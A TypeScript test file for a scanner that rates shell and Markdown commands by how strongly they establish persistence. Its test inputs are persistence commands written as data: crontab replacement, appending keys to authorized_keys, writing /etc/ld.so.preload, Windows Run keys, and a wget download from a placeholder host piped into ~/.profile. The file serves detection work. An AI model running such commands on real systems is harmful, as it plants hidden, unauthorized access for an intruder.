import { expect, test } from "bun:test";
import { persistence } from "./persistence.ts";
import { shellStatements } from "./shell.ts";

const noProseContext = { afterProhibition: () => false, demoted: () => false };

const inScript = (...lines: string[]) =>
  persistence(shellStatements(lines.join("\n"), false), noProseContext);

const inMarkdown = (text: string) => persistence(shellStatements(text, true), noProseContext);

test("the strongest match is reported with the match count", () => {
  expect(inScript("crontab -l", "crontab -l | cat - jobs.cron | crontab -")).toEqual({
    severity: "critical",
    line: 2,
    detail: "crontab -l | cat - jobs.cron | crontab - (3 matches)",
  });
});

test("crontab only lists or removes with -l or -r", () => {
  expect(inScript("crontab -u ada -l")?.severity).toBe("info");
  expect(inScript("crontab -r")?.severity).toBe("info");
  expect(inScript("crontab -e")?.severity).toBe("critical");
  expect(inScript("sudo crontab -u root jobs.cron")?.severity).toBe("critical");
});

test("an authorized_keys write is critical only when it appends", () => {
  expect(inScript("cat key.pub | tee -a /home/ada/.ssh/authorized_keys")?.severity).toBe(
    "critical",
  );
  expect(inScript("cat key.pub >> ${HOME}/.ssh/authorized_keys")?.severity).toBe("critical");
  expect(inScript("cat ~/.ssh/authorized_keys")).toBeUndefined();
});

test("a start file write rises to critical when it names /tmp, a download, or a URL", () => {
  expect(inScript("echo 'alias ll=\"ls -l\"' >> ~/.bash_profile")?.severity).toBe("warn");
  expect(
    inScript("echo 'set -x PATH ~/bin $PATH' | tee -a ~/.config/fish/config.fish")?.severity,
  ).toBe("warn");
  expect(inScript("echo '/tmp/.x &' >> ~/.zshenv")?.severity).toBe("critical");
  expect(inScript("wget -qO- https://x.invalid/rc >> ~/.profile")?.severity).toBe("critical");
});

test("launchd, systemd, preload and Run keys", () => {
  expect(inScript("launchctl bootstrap gui/501 ~/Library/LaunchAgents/a.plist")?.severity).toBe(
    "critical",
  );
  expect(inScript("launchctl list")).toBeUndefined();
  expect(inScript("sudo systemctl link /opt/a.service")?.severity).toBe("critical");
  expect(inScript("DYLD_INSERT_LIBRARIES=/tmp/a.dylib ./app")?.severity).toBe("critical");
  expect(inScript("echo /tmp/a.so | sudo tee /etc/ld.so.preload")?.severity).toBe("critical");
  expect(
    inScript(
      "New-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name a -Value b",
    )?.severity,
  ).toBe("critical");
  expect(inScript("Register-ScheduledTask -TaskName a -Action $action")?.severity).toBe("critical");
  expect(inScript("cp job /etc/cron.d/job")?.severity).toBe("critical");
});

test("Markdown prose needs the command at the start of a statement", () => {
  expect(inMarkdown("Edit the crontab file by hand.")).toBeUndefined();
  expect(inMarkdown("Run `crontab -e` and add the job.")?.severity).toBe("critical");
});
